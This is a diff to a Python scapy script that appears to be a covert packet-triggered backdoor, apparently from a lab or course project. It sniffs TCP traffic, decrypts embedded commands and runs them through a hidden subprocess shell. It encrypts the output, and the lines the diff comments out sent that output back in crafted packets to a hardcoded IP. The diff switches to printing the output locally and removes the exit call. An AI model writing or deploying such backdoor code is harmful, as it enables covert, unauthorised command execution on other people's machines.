@@ -45,7 +45,6 @@ def server(pkt):
             #If we get exit command, exit out of the system
             if newData == "exit":
                 time.sleep(2)
-                sys.exit()
             else:
                 #Run the command using a child process so that it is hidden
                 process = subprocess.Popen(newData, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -54,15 +53,16 @@ def server(pkt):
                 #Encrypt the output and add the packet authenticator before sending back
                 encryptedReply = crypt.encrypt(authPacket + output)
                 #Create the output packet
-
-                pkt = IP(src="192.168.0.15", dst="192.168.0.14")/TCP()/Raw(load=encryptedReply)
-                #Send the packet
-                send(pkt)
+                print output
+                # pkt = IP(src="192.168.0.15", dst="192.168.0.14")/TCP()/Raw(load=encryptedReply)
+                # #Send the packet
+                # send(pkt)
         else:
-            print data
+            print decryptedData[20:]
 
+if __name__ == "__main__":
 
-sniff(filter="tcp", prn=server)
+    sniff(filter="tcp", prn=server)
 
 
 
